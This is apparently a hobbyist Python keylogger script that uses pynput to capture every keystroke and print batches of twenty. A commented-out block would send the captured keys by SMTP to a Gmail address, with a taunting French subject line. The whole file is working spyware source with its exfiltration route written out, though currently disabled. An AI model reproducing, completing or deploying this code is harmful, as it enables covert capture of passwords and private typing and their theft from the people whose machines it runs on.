import os
os.chdir('D:\PYTHON')

import pynput
from pynput.keyboard import Key, Listener

import smtplib, ssl

keys = []
count = 0




def on_press(key):
    global count
    global keys
    keys.append(key)
    # write_file(keys)
    count+=1
    if count==20:
        count = 0
    #     port = 465  # For SSL
    #     smtp_server = "smtp.gmail.com"
    #     sender_email = "crackturtle126@gmail.com"  # Enter your
    #     password = "xxxxxxxxx"
    #
    #     receiver_email = "crackturtle126@gmail.com"  # Enter receiver address
    #     message = """\
    #     Subject: Tu veux savoir ce que je tape ?
    #
    #     """+str(keys)
    #     keys = []
    #
    # # Create a secure SSL context
    #     context = ssl.create_default_context()
    #
    #     with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
    #         server.login("crackturtle126@gmail.com", password)
    #         server.sendmail(sender_email, receiver_email, message)
        print(keys)


def on_release(key):

    print('{0} released'.format(key))
    if key == Key.esc:
        # Stop listener
        return False


with Listener(on_press = on_press) as listener:

    listener.join()
